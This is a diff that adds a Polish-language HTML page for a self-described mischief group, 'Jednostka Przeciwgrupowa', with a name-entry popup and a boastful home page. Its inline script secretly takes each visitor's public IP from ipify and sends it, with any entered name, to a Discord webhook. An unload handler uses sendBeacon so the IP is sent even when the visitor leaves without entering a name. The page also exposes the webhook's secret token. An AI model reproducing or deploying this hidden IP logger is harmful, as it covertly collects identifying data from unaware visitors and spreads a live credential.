@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Jednostka Przeciwgrupowa</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #fff;
+      color: #333;
+      height: 100%;
+    }
+    header {
+      background-color: #ff0000;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    nav {
+      background-color: #ff0000;
+      overflow: hidden;
+    }
+    nav a {
+      float: left;
+      display: block;
+      color: white;
+      text-align: center;
+      padding: 14px 16px;
+      text-decoration: none;
+    }
+    nav a:hover {
+      background-color: #cc0000;
+    }
+    main {
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      min-height: 60vh;
+    }
+    footer {
+      background-color: #ff0000;
+      text-align: center;
+      padding: 10px;
+      font-size: 12px;
+      color: white;
+      position: relative;
+      bottom: 0;
+      width: 100%;
+    }
+    footer img {
+      width: 100%;
+      max-width: 1000px;
+      margin-top: 10px;
+    }
+    .copyright {
+      margin-top: 10px;
+    }
+
+    #popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    #popupContent {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+    }
+
+    .legal {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .legal a {
+      color: #ff0000;
+      text-decoration: none;
+    }
+    .legal a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<div id="popup">
+  <div id="popupContent">
+    <h2>Kto ty jesteś? 🤨</h2>
+    <input type="text" id="username" placeholder="Podaj swoją nazwę" />
+    <br><br>
+    <button onclick="submitUser()">Wejdź</button>
+  </div>
+</div>
+
+  <header>
+    <h1>😈Witaj na oficjalnej stronie internetowej Jednostki Przeciwgupowej!😈</h1>
+    <p>To jest miejsce dla fanów, jak i hejterów</p>
+  </header>
+
+  <nav>
+    <a href="index.html">Strona główna</a>
+    <a href="kontakt.html">Kontakt</a>
+    <a href="o-nas.html">O nas</a>
+    <a href="terms.html">Zasady i warunki</a>
+  
+  </nav>
+
+  <main>
+    <h2>🔥 Strona główna 🔥</h2>
+    <p>Witaj na stronie!!! Mam nadzieję, że ci się podoba. Jak nie – to trudno, przeżyjemy. 😎</p>
+    <p>🔧 Tworzymy chaos z pasją, precyzją i... sporą dozą bekowego podejścia do życia.</p>
+    <p>🚪 Nie jesteśmy zapraszani. My po prostu wchodzimy.</p>
+    <p>🎭 Czasem działamy cicho, czasem głośno – ale zawsze skutecznie.</p>
+    <p>💣 Nie pytaj, co robimy. I tak nie uwierzysz.</p>
+    <p>Więc rozgość się, klikaj, zwiedzaj – ale pamiętaj... 👀 My też tu jesteśmy.</p>
+
+    <div class="legal">
+      <p>Przed korzystaniem z naszej strony zapoznaj się z naszymi <a href="terms.html">Zasadami i warunkami</a> oraz <a href="privacy-policy.html">Polityką prywatności</a>.</p>
+    </div>
+  </main>
+
+  <footer>
+    <img src="a.jpg" alt="Stopka">
+    <div class="copyright">
+      &copy; 2025 Moja Strona. Wszelkie prawa zastrzeżone. Strona utworzona przez użytkownika *******(tego i tak ci nie powiemy)
+    </div>
+  </footer>
+
+<script>
+  let username = "--"; // Domyślnie ustawiamy nazwę na "--"
+
+  // Funkcja wysyłająca dane do webhooka
+  function submitUser() {
+    const inputUsername = document.getElementById("username").value;
+    if (inputUsername) {
+      username = inputUsername;
+    }
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const payload = {
+          content: `👀 Nowe wejście na stronę:\n🧑‍💻 Nazwa: ${username}\n🌍 IP: ${ip}`
+        };
+
+        fetch("https://discord.com/api/webhooks/1364632834236743740/lmC7HhXBVzE4snxn9tPaolCHagVYZg5hwlNiHmhL_yAwM8wGMKTmMwSlb3hJdJMG-r2_", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        document.getElementById("popup").style.display = "none"; // Ukrycie popupu po zatwierdzeniu
+      })
+      .catch(err => {
+        alert("Nie udało się pobrać IP.");
+        console.error(err);
+      });
+  }
+
+  // Wysłanie IP przy opuszczeniu strony - nawet przy szybkim zamknięciu karty
+  window.addEventListener("unload", function() {
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const payload = {
+          content: `👀 Użytkownik opuścił stronę bez wprowadzenia nazwy:\n🧑‍💻 Nazwa: --\n🌍 IP: ${ip}`
+        };
+
+        navigator.sendBeacon("https://discord.com/api/webhooks/1364632834236743740/lmC7HhXBVzE4snxn9tPaolCHagVYZg5hwlNiHmhL_yAwM8wGMKTmMwSlb3hJdJMG-r2_", JSON.stringify(payload));
+      })
+      .catch(err => {
+        console.error("Błąd przy próbie wysłania danych:", err);
+      });
+  });
+</script>
+
+</body>
+</html>
